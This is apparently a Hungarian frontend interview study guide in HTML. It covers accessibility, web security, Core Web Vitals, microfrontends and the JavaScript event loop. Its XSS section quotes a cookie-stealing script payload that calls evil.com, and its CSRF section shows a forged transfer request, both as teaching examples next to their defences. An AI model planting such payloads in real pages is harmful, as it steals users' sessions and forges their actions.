+  Ugrás a tartalomhoz
+&lt;/a&gt;
+
+&lt;nav&gt;...&lt;/nav&gt;
+
+&lt;main id="main-content" tabindex="-1"&gt;
+  &lt;!-- A tabindex="-1" lehetővé teszi a programozott fókuszt --&gt;
+  &lt;h1&gt;Főcím&lt;/h1&gt;
+&lt;/main&gt;
+
+&lt;style&gt;
+.skip-link {
+  position: absolute;
+  top: -40px;
+  left: 0;
+  padding: 8px;
+  background: #000;
+  color: #fff;
+  z-index: 100;
+  transition: top 0.2s;
+}
+.skip-link:focus {
+  top: 0; /* TAB-ra megjelenik */
+}
+&lt;/style&gt;</code></pre>
+
+<h3>14.9 Focus trap (modális dialógusokhoz)</h3>
+<p>Amikor egy <strong>modális dialógus</strong> nyitva van, a fókusznak a dialóguson <strong>belül kell maradnia</strong> – TAB-bal nem szabad "kiszöknie" a háttérbe. Ezt <strong>focus trap</strong>-nek hívjuk. Bezáráskor a fókuszt vissza kell tenni arra az elemre, ami a dialógust megnyitotta.</p>
+
+<pre><code>function trapFocus(dialogEl) {
+  const focusableEls = dialogEl.querySelectorAll(
+    'a[href], button, input, textarea, select, [tabindex]:not([tabindex="-1"])'
+  );
+  const firstEl = focusableEls[0];
+  const lastEl = focusableEls[focusableEls.length - 1];
+
+  dialogEl.addEventListener("keydown", (e) => {
+    if (e.key === "Tab") {
+      if (e.shiftKey) {
+        // Shift+Tab – ha az első elemen vagyunk, ugorjunk az utolsóra
+        if (document.activeElement === firstEl) {
+          e.preventDefault();
+          lastEl.focus();
+        }
+      } else {
+        // Tab – ha az utolsó elemen vagyunk, ugorjunk az elsőre
+        if (document.activeElement === lastEl) {
+          e.preventDefault();
+          firstEl.focus();
+        }
+      }
+    }
+    if (e.key === "Escape") closeDialog();
+  });
+
+  firstEl.focus(); // Megnyitáskor az első elemre fókuszálunk
+}
+
+// Natív HTML &lt;dialog&gt; elem – beépített focus trap!
+const dialog = document.querySelector("dialog");
+dialog.showModal(); // Automatikus focus trap + Escape bezárás + backdrop</code></pre>
+
+<div class="note">
+  <strong>Tesztelési ellenőrzőlista:</strong>
+  <ul>
+    <li>Tudod-e TAB-bal bejárni az oldalt?</li>
+    <li>Minden interaktív elem fókuszálható és aktiválható billentyűzettel?</li>
+    <li>Van-e <strong>skip to content</strong> link?</li>
+    <li>A heading hierarchia (h1→h2→h3) logikus?</li>
+    <li>Modális dialógusoknál működik a <strong>focus trap</strong>?</li>
+    <li>Működik-e screen readerrel? (NVDA, VoiceOver)</li>
+    <li>Lighthouse Accessibility score 90+ ?</li>
+    <li>Teszteld a <code class="inline-code">&lt;dialog&gt;</code> natív HTML elemet – beépített a11y támogatás!</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 15. WEB SECURITY -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q15">
+<h2>15. Web Security</h2>
+<span class="tag">Biztonság</span>
+
+<p>A webes biztonság az <strong>OWASP Top 10</strong> lista köré szerveződik – ez a leggyakoribb webes sebezhetőségek rangsorolása, amit rendszeresen frissítenek. Frontend fejlesztőként különösen az <strong>XSS</strong>, <strong>CSRF</strong> és az adatszivárgással kapcsolatos kockázatokra kell figyelned. Az interjún általában azt kérdezik, hogy ismered-e ezeket, és hogyan védekezünk ellenük.</p>
+
+<h3>15.1 XSS (Cross-Site Scripting)</h3>
+<p>A támadó <strong>rosszindulatú JavaScript kódot</strong> juttat be az oldalra, ami más felhasználók böngészőjében fut le. Három típusa van:</p>
+<ul>
+  <li><strong>Stored XSS</strong>: A rosszindulatú kód az adatbázisban tárolódik (pl. komment, fórum post), és minden felhasználónak megjelenik.</li>
+  <li><strong>Reflected XSS</strong>: A kód az URL-ben van (pl. keresési paraméter), és a szerver visszatükrözi a válaszban.</li>
+  <li><strong>DOM-based XSS</strong>: Teljesen kliens oldali – a JavaScript közvetlenül a DOM-ba írja a felhasználói inputot.</li>
+</ul>
+
+<pre><code>// ❌ Stored XSS – a támadó ezt írja egy komment mezőbe:
+// &lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
+
+// ❌ ROSSZ – React-ben is lehet XSS!
+function Comment({ html }) {
+  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
+  // Ha a "html" felhasználói input → XSS!
+}
+
+// ❌ ROSSZ – innerHTML
+element.innerHTML = userInput; // SOHA ne csinálj ilyet!
+
+// ✅ JÓ – textContent (nem értelmez HTML-t)
+element.textContent = userInput;
+
+// ✅ JÓ – React alapból escapeli a JSX-et
+function Comment({ text }) {
+  return &lt;div&gt;{text}&lt;/div&gt;; // Biztonságos – a React escapeli
+}</code></pre>
+
+<h3>15.2 CSRF (Cross-Site Request Forgery)</h3>
+<p>A támadó ráveszi a felhasználót, hogy (tudtán kívül) kérést küldjön egy másik oldalra, ahol be van jelentkezve. A támadás azért működik, mert a böngésző <strong>automatikusan csatolja a cookie-kat</strong> minden kéréshez az adott domain felé – tehát a szerver nem tudja megkülönböztetni a "valódi" kérést a "hamisítotttól".</p>
+
+<pre><code>&lt;!-- Támadó oldal – ha a felhasználó be van jelentkezve a bank oldalán --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000" /&gt;
+&lt;!-- A böngésző elküldi a bank cookie-ját → az utalás megtörténik! --&gt;
+
+// ✅ VÉDELEM:
+// 1. CSRF Token – minden form-hoz egyedi, titkos token
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="_csrf" value="random-secret-token" /&gt;
+  ...
+&lt;/form&gt;
+
+// 2. SameSite cookie attribútum
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+// SameSite=Strict → a cookie NEM küldhető más oldalakról
+// SameSite=Lax    → GET kéréseknél engedélyezett (link navigáció)
+
+// 3. Origin / Referer header ellenőrzés a szerveren</code></pre>
+
+<h3>15.3 CSP (Content Security Policy)</h3>
+<p>HTTP header, ami megmondja a böngészőnek, <strong>honnan tölthet be erőforrásokat</strong> (script, style, img stb.).</p>
+
+<pre><code>// HTTP header példák:
+
+// Csak saját domainről tölthet be mindent
+Content-Security-Policy: default-src 'self'
+
+// Script: saját domain + CDN, Style: saját + Google Fonts, Kép: bárhonnan
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' https://fonts.googleapis.com;
+  img-src *;
+  font-src https://fonts.gstatic.com
+
+// Inline script tiltása (XSS védelem!)
+// 'unsafe-inline' → KERÜLENDŐ, mert engedi az inline scripteket
+Content-Security-Policy: script-src 'self'
+// → &lt;script&gt;alert('xss')&lt;/script&gt; NEM futhat le!
+
+// Nonce alapú engedélyezés (inline script-ekhez):
+Content-Security-Policy: script-src 'nonce-abc123'
+// → Csak &lt;script nonce="abc123"&gt; futhat le
+
+// Meta tag-ben is megadható (de kevésbé biztonságos):
+&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'" /&gt;</code></pre>
+
+<h3>15.4 CORS (Cross-Origin Resource Sharing)</h3>
+<p>A böngésző <strong>Same-Origin Policy (SOP)</strong>-ja alapból blokkolja a más domain-re (<strong>origin</strong> = protokoll + domain + port) küldött AJAX kéréseket. Ez egy <strong>biztonsági mechanizmus</strong>, nem hiba! A CORS headerekkel a szerver explicit engedélyezheti, hogy bizonyos origin-ekről érkező kéréseket fogadjon. Fontos: a CORS <strong>böngésző-szintű védelem</strong> – a szerverre a kérés megérkezik, de a böngésző <strong>nem engedi a JavaScript-nek</strong> a válasz olvasását, ha a headerek nem megfelelőek.</p>
+
+<pre><code>// Kliens: https://frontend.com → Szerver: https://api.backend.com
+
+// A szerver válasz headerek:
+Access-Control-Allow-Origin: https://frontend.com   // Melyik origin engedélyezett
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE // Engedélyezett HTTP metódusok
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true               // Cookie küldés engedélyezése
+Access-Control-Max-Age: 86400                        // Preflight cache (sec)
+
+// ⚠️ VESZÉLYES:
+Access-Control-Allow-Origin: *           // Mindenkit beenged
+// ÉS
+Access-Control-Allow-Credentials: true   // Ez a kettő EGYÜTT NEM MŰKÖDIK (biztonsági ok)
+
+// PREFLIGHT kérés (OPTIONS):
+// Mielőtt a böngésző POST/PUT/DELETE-et küld, előbb egy OPTIONS kérést küld:
+// → A szerver válaszol a CORS headerekkel
+// → Ha OK → a tényleges kérés elindul
+// → Ha NEM → a böngésző blokkolja (CORS error a konzolban)
+
+// Mely kérések NEM igényelnek preflight-ot? ("Simple requests")
+// - GET, HEAD, POST
+// - Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
+// - Nincs egyedi header</code></pre>
+
+<h3>15.5 Egyéb biztonsági headerek</h3>
+<pre><code>// Fontos HTTP biztonsági headerek:
+
+// 1. HTTPS kikényszerítése
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+
+// 2. Clickjacking védelem – tiltja az iframe-be ágyazást
+X-Frame-Options: DENY
+// Vagy CSP-vel:
+Content-Security-Policy: frame-ancestors 'none'
+
+// 3. MIME-type sniffing megelőzése
+X-Content-Type-Options: nosniff
+
+// 4. Cookie biztonsági beállítások
+Set-Cookie: session=abc;
+  HttpOnly;    // JavaScript (document.cookie) nem fér hozzá
+  Secure;      // Csak HTTPS-en keresztül küldődik
+  SameSite=Strict;
+  Path=/;
+  Max-Age=3600</code></pre>
+
+<div class="note">
+  <strong>Összefoglalás – interjúra:</strong>
+  <ul>
+    <li><strong>XSS</strong>: Ne használj <code>innerHTML</code> / <code>dangerouslySetInnerHTML</code> felhasználói inputtal</li>
+    <li><strong>CSRF</strong>: CSRF token + <code>SameSite</code> cookie</li>
+    <li><strong>CSP</strong>: Whitelist-alapú erőforrás-betöltés kontroll</li>
+    <li><strong>CORS</strong>: Szerver oldali header-ek, amik engedélyezik a cross-origin kéréseket</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 16. CORE WEB VITALS -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q16">
+<h2>16. Core Web Vitals</h2>
+<span class="tag">Teljesítmény</span>
+
+<p>A <strong>Web Vitals</strong> a Google által definiált mérőszámok gyűjteménye, amelyek a felhasználói élmény minőségét mérik. A "Core" jelző a <strong>három legfontosabb metrikát</strong> jelöli, amelyek a Google keresési rangsorolás részét is képezik. Ezek mellett léteznek egyéb fontos metrikák is (TTFB, FCP, TTI), amelyeket szintén érdemes ismerni.</p>
+
+<h3>16.1 A három fő metrika (Core)</h3>
+<table>
+  <tr><th>Metrika</th><th>Mit mér?</th><th>Jó</th><th>Gyenge</th></tr>
+  <tr>
+    <td><strong>LCP</strong><br>(Largest Contentful Paint)</td>
+    <td>Mikor jelenik meg a <strong>legnagyobb vizuális elem</strong> (kép, h1, video)?</td>
+    <td>&le; 2.5s</td>
+    <td>&gt; 4.0s</td>
+  </tr>
+  <tr>
+    <td><strong>INP</strong><br>(Interaction to Next Paint)</td>
+    <td>Mennyi idő telik el egy interakció (kattintás, billentyű) és a <strong>vizuális válasz</strong> között?</td>
+    <td>&le; 200ms</td>
+    <td>&gt; 500ms</td>
+  </tr>
+  <tr>
+    <td><strong>CLS</strong><br>(Cumulative Layout Shift)</td>
+    <td>Mennyire <strong>ugrálnak az elemek</strong> betöltés közben?</td>
+    <td>&le; 0.1</td>
+    <td>&gt; 0.25</td>
+  </tr>
+</table>
+
+<div class="warning">
+  <strong>Megjegyzés:</strong> A <strong>FID (First Input Delay)</strong> 2024 márciusától <strong>INP</strong>-re cserélődött. Az INP az ÖSSZES interakciót méri az oldal életciklusa során, nem csak az elsőt.
+</div>
+
+<h3>16.2 Egyéb fontos metrikák</h3>
+<table>
+  <tr><th>Metrika</th><th>Mit mér?</th><th>Jó</th></tr>
+  <tr>
+    <td><strong>TTFB</strong><br>(Time to First Byte)</td>
+    <td>Mennyi idő telik el a kérés elküldésétől az <strong>első byte</strong> megérkezéséig? A szerver és a hálózat sebességét méri.</td>
+    <td>&le; 800ms</td>
+  </tr>
+  <tr>
+    <td><strong>FCP</strong><br>(First Contentful Paint)</td>
+    <td>Mikor jelenik meg az <strong>első vizuális tartalom</strong> (szöveg, kép, SVG)? A felhasználó számára ez a "valami történik" pillanata.</td>
+    <td>&le; 1.8s</td>
+  </tr>
+  <tr>
+    <td><strong>TTI</strong><br>(Time to Interactive)</td>
+    <td>Mikor lesz az oldal <strong>teljesen interaktív</strong> (a main thread 5+ mp-ig szabad)? Lab-only metrika.</td>
+    <td>&le; 3.8s</td>
+  </tr>
+  <tr>
+    <td><strong>TBT</strong><br>(Total Blocking Time)</td>
+    <td>Összesen mennyi ideig volt a main thread <strong>blokkolva</strong> (50ms+ feladatok) az FCP és a TTI között?</td>
+    <td>&le; 200ms</td>
+  </tr>
+</table>
+
+<p><strong>Az időrendi sorrend:</strong> TTFB → FCP → LCP → TTI. A felhasználó először a TTFB-t "éli meg" (üres képernyő), majd az FCP-nél lát először valamit, az LCP-nél a fő tartalom megjelenik, végül az oldal interaktívvá válik (TTI).</p>
+
+<h3>16.3 LCP optimalizáció</h3>
+<pre><code>&lt;!-- ❌ ROSSZ – nagy kép, lazy loaded, nincs preload --&gt;
+&lt;img src="hero.jpg" loading="lazy" /&gt;
+
+&lt;!-- ✅ JÓ – hero kép optimalizálása --&gt;
+&lt;link rel="preload" as="image" href="hero.webp" /&gt;
+&lt;img
+  src="hero.webp"
+  alt="Hero kép"
+  width="1200"
+  height="600"
+  loading="eager"
+  fetchpriority="high"
+  decoding="async"
+/&gt;
+
+&lt;!-- Szerver oldali optimalizáció: --&gt;
+&lt;!-- 1. CDN használata --&gt;
+&lt;!-- 2. Képek tömörítése (WebP, AVIF) --&gt;
+&lt;!-- 3. Szerver response time csökkentése (TTFB &lt; 800ms) --&gt;
+&lt;!-- 4. Kritikus CSS inline-olása --&gt;
+&lt;!-- 5. Render-blocking JS elkerülése --&gt;</code></pre>
+
+<h3>16.4 INP optimalizáció</h3>
+<p>Az INP a <strong>leglassabb interakciót</strong> méri az oldal élettartama során (a 98. percentilis). A cél: minden kattintás, billentyűleütés és érintés után <strong>200ms-on belül</strong> vizuális visszajelzés. Ha a main thread-en hosszú szinkron műveletek futnak, az UI "lefagy" – ez rossz INP-t eredményez.</p>
+<pre><code>// ❌ ROSSZ – hosszú main thread blokkolás
+button.addEventListener("click", () => {
+  // 500ms-es szinkron számítás – az UI "lefagy"
+  const result = heavyComputation(data);
+  updateDOM(result);
+});
+
+// ✅ JÓ – felosztás kisebb chunk-okra
+button.addEventListener("click", async () => {
+  // Azonnali vizuális visszajelzés
+  showSpinner();
+
+  // Nehéz munka átadása a következő frame-re
+  const result = await yieldToMain(() => heavyComputation(data));
+  updateDOM(result);
+  hideSpinner();
+});
+
+// yield to main thread helper
+function yieldToMain(fn) {
+  return new Promise(resolve => {
+    setTimeout(() => resolve(fn()), 0);
+  });
+}
+
+// React-ben: useTransition pont erre való!
+const [isPending, startTransition] = useTransition();
+function handleClick() {
+  startTransition(() => {
+    setFilteredItems(heavyFilter(items));
+  });
+}</code></pre>
+
+<h3>16.5 CLS optimalizáció</h3>
+<p>A CLS nem egy időértéket mér, hanem egy <strong>egység nélküli pontszámot</strong>, ami azt jelzi, mennyire "ugrálnak" az elemek betöltés közben. Minden váratlan layout shift-nél a böngésző kiszámítja az elmozdult terület arányát és az elmozdulás mértékét. Az cél: <strong>0.1 alatt tartani</strong>. A leggyakoribb ok: méret nélküli képek, késve betöltődő fontok és dinamikusan beszúrt tartalom (reklámok, cookie sáv).</p>
+<pre><code>&lt;!-- ❌ ROSSZ – nincs méret → betöltéskor ugrik a layout --&gt;
+&lt;img src="photo.jpg" /&gt;
+
+&lt;!-- ✅ JÓ – explicit méret VAGY aspect-ratio --&gt;
+&lt;img src="photo.jpg" width="800" height="600" alt="..." /&gt;
+
+&lt;style&gt;
+/* Vagy CSS-ben: */
+img {
+  aspect-ratio: 16 / 9;
+  width: 100%;
+  height: auto;
+}
+
+/* Font-okra: */
+@font-face {
+  font-family: "MyFont";
+  src: url("myfont.woff2") format("woff2");
+  font-display: swap;     /* Fallback font megjelenítése amíg tölt */
+  /* font-display: optional; – ha nem jön be gyorsan, nem is használja */
+}
+
+/* Dinamikus tartalom (reklámok, bannerek) – helyfoglalás: */
+.ad-slot {
+  min-height: 250px; /* Foglald le a helyet előre! */
+}
+&lt;/style&gt;
+
+&lt;!-- Fontos CLS okok: --&gt;
+&lt;!-- 1. Méret nélküli képek / videók --&gt;
+&lt;!-- 2. Dinamikusan beszúrt tartalom (ads, bannerek, cookie sáv) --&gt;
+&lt;!-- 3. Webes fontok FOUT/FOIT (flash of unstyled/invisible text) --&gt;
+&lt;!-- 4. Késleltetett CSS betöltés --&gt;</code></pre>
+
+<h3>16.6 Performance budget</h3>
+<p>A <strong>performance budget</strong> az a döntés, hogy az oldal teljesítményére konkrét <strong>határértékeket</strong> szabsz, és ezek túllépésekor a build/deploy megáll. Ez segít megelőzni a fokozatos teljesítmény-romlást (performance regression).</p>
+
+<pre><code>// Példa performance budget (JSON config):
+{
+  "budgets": [
+    { "metric": "LCP",         "budget": 2500  },
+    { "metric": "CLS",         "budget": 0.1   },
+    { "metric": "INP",         "budget": 200   },
+    { "metric": "total-js",    "budget": 300000 },  // max 300KB JS
+    { "metric": "total-image", "budget": 500000 }   // max 500KB képek
+  ]
+}
+
+// Webpack-ben:
+module.exports = {
+  performance: {
+    maxAssetSize: 250000,       // 250KB fájlméret figyelmeztetés
+    maxEntrypointSize: 400000,  // 400KB entry point limit
+    hints: "error",             // "warning" vagy "error" (megállítja a build-et)
+  },
+};</code></pre>
+
+<h3>16.7 Mérési eszközök</h3>
+<pre><code>// 1. Böngészőben (JavaScript API):
+new PerformanceObserver((list) => {
+  for (const entry of list.getEntries()) {
+    console.log(`${entry.name}: ${entry.startTime}ms`);
+  }
+}).observe({ type: "largest-contentful-paint", buffered: true });
+
+// 2. web-vitals könyvtár (Google):
+import { onLCP, onINP, onCLS } from "web-vitals";
+
+onLCP(metric  => console.log("LCP:", metric.value));
+onINP(metric  => console.log("INP:", metric.value));
+onCLS(metric  => console.log("CLS:", metric.value));
+
+// 3. Eszközök:
+// - Chrome DevTools → Performance tab
+// - Lighthouse (Chrome DevTools → Lighthouse tab)
+// - PageSpeed Insights (lab + field data)
+// - Chrome UX Report (CrUX) – valós felhasználói adatok</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> A Web Vitals a <strong>Google keresési rangsorolás</strong> egyik faktora. Mindig tudd, mit mér mindhárom metrika, és adj konkrét optimalizációs példákat.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 17. MICROFRONTEND ARCHITEKTÚRA -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q17">
+<h2>17. Microfrontend architektúra</h2>
+<span class="tag">Architektúra</span>
+
+<h3>17.1 Mi az a microfrontend?</h3>
+<p>A <strong>microservices</strong> koncepció alkalmazása a frontendre: a nagy monolitikus frontend alkalmazást <strong>kisebb, önálló, független csapatok által fejlesztett részekre</strong> bontjuk. Minden rész saját technológiát, build-et és deployment-et használhat.</p>
+
+<pre><code>/*
+  MONOLITH:                          MICROFRONTEND:
+  ┌─────────────────────┐            ┌───────┐ ┌───────┐ ┌───────┐
+  │                     │            │ Team A│ │ Team B│ │ Team C│
+  │   Egyetlen nagy     │            │ React │ │  Vue  │ │Angular│
+  │   React alkalmazás  │    →       │ Profil│ │ Shop  │ │ Admin │
+  │                     │            │       │ │       │ │       │
+  │   1 repo, 1 build   │            │ Saját │ │ Saját │ │ Saját │
+  │   1 csapat          │            │ deploy│ │ deploy│ │ deploy│
+  └─────────────────────┘            └───────┘ └───────┘ └───────┘
+*/</code></pre>
+
+<h3>17.2 Megvalósítási módok</h3>
+<p>A microfrontend-ek integrálhatók <strong>build-time</strong> (fordítási időben) vagy <strong>run-time</strong> (futás közben). A build-time egyszerűbb, de elveszítjük a független deployálás előnyét. A run-time megoldások rugalmasabbak, de komplexebbek. Az alábbi táblázat összefoglalja a lehetőségeket:</p>
+
+<h3>17.2.1 Build-time integráció (NPM csomag)</h3>
+<pre><code>// Minden microfrontend saját NPM csomag
+// package.json:
+{
+  "dependencies": {
+    "@myapp/header": "^1.2.0",
+    "@myapp/product-page": "^2.0.0",
+    "@myapp/cart": "^1.5.0"
+  }
+}
+
+// ❌ Hátrány: ha bármelyik csomag frissül → az EGÉSZET újra kell buildelni
+// → Elveszítjük a független deployálás előnyét!</code></pre>
+
+<h3>17.2.2 Run-time integráció: iframe</h3>
+<pre><code>&lt;!-- Egyszerű, teljes izoláció – de sok hátrány --&gt;
+&lt;iframe src="https://shop.myapp.com/product/123"&gt;&lt;/iframe&gt;
+
+&lt;!-- ❌ Hátrányok:
+  - Responsive design nehézkes
+  - Kommunikáció bonyolult (postMessage)
+  - Duplikált erőforrások (CSS, JS betölt minden iframe-ben)
+  - SEO problémák
+  - Nem egységes UX (scroll, navigáció)
+--&gt;</code></pre>
+
+<h3>17.2.3 Run-time integráció: Module Federation (Webpack 5 / Vite)</h3>
+<p>A <strong>Module Federation</strong> a Webpack 5 beépített funkciója, ami lehetővé teszi, hogy egy alkalmazás <strong>futás közben töltsön be modulokat</strong> egy másik, önállóan deployolt alkalmazásból. A <code>shared</code> konfiguráció megakadályozza a közös dependency-k (pl. React) duplikálását. Ez a <strong>legnépszerűbb</strong> modern microfrontend megoldás, mert a fejlesztői élmény szinte olyan, mintha egyetlen alkalmazás lenne.</p>
+<pre><code>// A LEGNÉPSZERŰBB modern megoldás!
+
+// ═══ HOST alkalmazás (shell) – webpack.config.js ═══
+const ModuleFederationPlugin = require("webpack/lib/container/ModuleFederationPlugin");
+
+module.exports = {
+  plugins: [
+    new ModuleFederationPlugin({
+      name: "shell",
+      remotes: {
+        // Futásidőben tölti be a távoli modulokat!
+        productApp: "productApp@https://product.myapp.com/remoteEntry.js",
+        cartApp: "cartApp@https://cart.myapp.com/remoteEntry.js",
+      },
+      shared: {
+        react: { singleton: true, requiredVersion: "^18.0.0" },
+        "react-dom": { singleton: true },
+      },
+    }),
+  ],
+};
+
+// ═══ REMOTE alkalmazás (product) – webpack.config.js ═══
+module.exports = {
+  plugins: [
+    new ModuleFederationPlugin({
+      name: "productApp",
+      filename: "remoteEntry.js",
+      exposes: {
+        "./ProductList": "./src/components/ProductList",
+        "./ProductDetail": "./src/components/ProductDetail",
+      },
+      shared: {
+        react: { singleton: true },
+        "react-dom": { singleton: true },
+      },
+    }),
+  ],
+};
+
+// ═══ HOST-ban használjuk a remote komponenst ═══
+import React, { Suspense } from "react";
+
+const ProductList = React.lazy(() => import("productApp/ProductList"));
+
+function App() {
+  return (
+    &lt;Suspense fallback={&lt;p&gt;Betöltés...&lt;/p&gt;}&gt;
+      &lt;ProductList /&gt;
+    &lt;/Suspense&gt;
+  );
+}</code></pre>
+
+<h3>17.2.4 Run-time integráció: Web Components (Custom Elements)</h3>
+<pre><code>// Minden microfrontend egy Custom Element-ként regisztrálja magát
+// Framework-független – React, Vue, Angular is tud Custom Element-et használni
+
+// ═══ Cart microfrontend (akár Vue-ban is lehet) ═══
+class CartWidget extends HTMLElement {
+  connectedCallback() {
+    const shadow = this.attachShadow({ mode: "open" });
+    shadow.innerHTML = `
+      &lt;style&gt;
+        .cart { padding: 1rem; border: 1px solid #ccc; }
+      &lt;/style&gt;
+      &lt;div class="cart"&gt;
+        &lt;h3&gt;Kosár&lt;/h3&gt;
+        &lt;slot&gt;&lt;/slot&gt;
+      &lt;/div&gt;
+    `;
+  }
+}
+customElements.define("cart-widget", CartWidget);
+
+// ═══ Shell alkalmazásban: ═══
+&lt;cart-widget&gt;&lt;/cart-widget&gt;
+// CSS izoláció a Shadow DOM miatt!</code></pre>
+
+<h3>17.3 Kommunikáció microfrontend-ek között</h3>
+<p>A microfrontend-ek közötti kommunikáció a legnagyobb architekturális kihívás. Túl szoros csatolás (tight coupling) esetén elveszítjük a függetlenség előnyét. A fő szabály: <strong>minél kevesebb kommunikáció, annál jobb</strong>. Ha két microfrontend sokat kommunikál, valószínűleg egy közös microfrontend-nek kellene lenniük.</p>
+<pre><code>// 1. Custom Events (DOM-szintű, framework-független)
+// Cart microfrontend – eseményt dob:
+window.dispatchEvent(new CustomEvent("cart:item-added", {
+  detail: { productId: 123, quantity: 1 }
+}));
+
+// Header microfrontend – figyeli:
+window.addEventListener("cart:item-added", (e) => {
+  updateCartBadge(e.detail.quantity);
+});
+
+// 2. Shared state (pl. egyszerű pub/sub)
+class EventBus {
+  constructor() { this.listeners = {}; }
+  on(event, fn) {
+    (this.listeners[event] ??= []).push(fn);
+  }
+  emit(event, data) {
+    this.listeners[event]?.forEach(fn => fn(data));
+  }
+  off(event, fn) {
+    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);
+  }
+}
+
+// Globálisan elérhető:
+window.__eventBus = new EventBus();
+
+// 3. URL / route alapú kommunikáció
+// Megosztott router (pl. single-spa) – az URL a "közös nyelv"</code></pre>
+
+<h3>17.4 Előnyök és hátrányok</h3>
+<table>
+  <tr><th>Előnyök</th><th>Hátrányok</th></tr>
+  <tr><td>Független deployment (csapatonként)</td><td>Komplexebb infrastruktúra</td></tr>
+  <tr><td>Technológia-függetlenség</td><td>Bundle méret nőhet (duplikált függőségek)</td></tr>
+  <tr><td>Kisebb, fókuszált kódbázisok</td><td>Konzisztens UX nehezebb (design system kell!)</td></tr>
+  <tr><td>Skálázható csapatszerkezet</td><td>Tesztelés bonyolultabb (integrációs tesztek)</td></tr>
+  <tr><td>Fokozatos migráció lehetősége</td><td>Teljesítmény overhead (több JS bundle)</td></tr>
+</table>
+
+<h3>17.5 Megosztott Design System</h3>
+<p>A microfrontend architektúra egyik legnagyobb veszélye a <strong>UX inkonzisztencia</strong> – ha minden csapat maga készíti a gombokat, input mezőket, szín palettát, az oldal "szétesik". Ezért <strong>közös design system</strong> (komponens könyvtár) szükséges, amit minden microfrontend használ. Ez általában egy külön NPM csomag, amit szemantikus verziózással kezelünk.</p>
+
+<pre><code>// Közös design system csomag – minden microfrontend függőségként használja
+// @myapp/design-system
+export { Button } from "./Button";
+export { Input } from "./Input";
+export { Modal } from "./Modal";
+export { theme } from "./theme";    // közös színek, spacingek, tipográfia
+
+// Verziókezelés: semver
+// @myapp/design-system@2.3.1
+// Major: breaking change (pl. Button API változás)
+// Minor: új komponens (pl. Tooltip hozzáadása)
+// Patch: bug fix
+
+// Microfrontend package.json:
+{
+  "dependencies": {
+    "@myapp/design-system": "^2.0.0"  // kompatibilis a 2.x verzióval
+  }
+}</code></pre>
+
+<h3>17.6 Mikor érdemes microfrontend-et használni?</h3>
+<pre><code>/*
+  ✅ IGEN, ha:
+  - Nagy szervezet (5+ csapat dolgozik a frontenden)
+  - Független release ciklusok szükségesek
+  - Legacy rendszer fokozatos modernizálása
+  - Eltérő technológiák együttélése (React + Angular migráció)
+
+  ❌ NEM, ha:
+  - Kis csapat (1-3 fejlesztő)
+  - Egyszerű alkalmazás
+  - Nincs szükség független deploymentre
+  - → Monolith vagy egyszerű mono-repo jobb választás!
+*/</code></pre>
+
+<div class="note">
+  <strong>Keretrendszerek:</strong>
+  <ul>
+    <li><strong>Module Federation</strong> (Webpack 5 / Vite) – leggyakoribb modern megoldás</li>
+    <li><strong>single-spa</strong> – routing-alapú orchestrator, több framework együtt</li>
+    <li><strong>qiankun</strong> – single-spa-ra épülő, kínai Ant Group által fejlesztett</li>
+    <li><strong>Bit</strong> – komponens-szintű kompozíció</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 18. JAVASCRIPT EVENT LOOP / CONCURRENCY MODEL -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q18">
+<h2>18. JavaScript Event Loop / Concurrency Model</h2>
+<span class="tag">JS haladó</span> <span class="tag">Aszinkronitás</span>
+
+<p>A JavaScript <strong>egyetlen szálon</strong> (single-threaded) fut – egyszerre csak egy dolgot tud csinálni. Mégis képes aszinkron műveleteket kezelni (API hívások, timer-ek, felhasználói interakciók) anélkül, hogy az oldal "lefagyna". Ezt az <strong>Event Loop</strong> mechanizmus teszi lehetővé, ami a JavaScript runtime, a böngésző API-k és a feladat-sorok (queue-k) együttműködésére épül.</p>
+<p>Ez az egyik <strong>leggyakrabban kérdezett</strong> interjú téma, mert az aszinkron JavaScript viselkedés megértése alapvető a hibakereséshez és a teljesítmény-optimalizáláshoz.</p>
+
+<h3>18.1 A futtatási környezet felépítése</h3>
+<p>A JavaScript runtime nem önmagában dolgozik – a böngésző (vagy Node.js) biztosítja a háttérszolgáltatásokat. Az egész rendszer négy fő részből áll:</p>
+
+<pre><code>/*
+  ┌──────────────────────────────────────────────────────────────────┐
+  │                     JAVASCRIPT RUNTIME                          │
+  │                                                                  │
+  │  ┌──────────────┐    ┌──────────────────────────────────────┐   │
+  │  │   HEAP        │    │          CALL STACK                  │   │
+  │  │  (memória)    │    │                                      │   │
+  │  │               │    │  A végrehajtás sorrendje:             │   │
+  │  │  Objektumok,  │    │  LIFO (Last In, First Out)           │   │
+  │  │  változók     │    │                                      │   │
+  │  │  tárolódnak   │    │  ┌────────────────────────┐          │   │
+  │  │  itt          │    │  │ console.log("hello")   │ ← aktuális│  │
+  │  │               │    │  ├────────────────────────┤          │   │
+  │  │               │    │  │ greet()                │          │   │
+  │  │               │    │  ├────────────────────────┤          │   │
+  │  │               │    │  │ main()                 │          │   │
+  │  └──────────────┘    │  └────────────────────────┘          │   │
+  │                       └──────────────────────────────────────┘   │
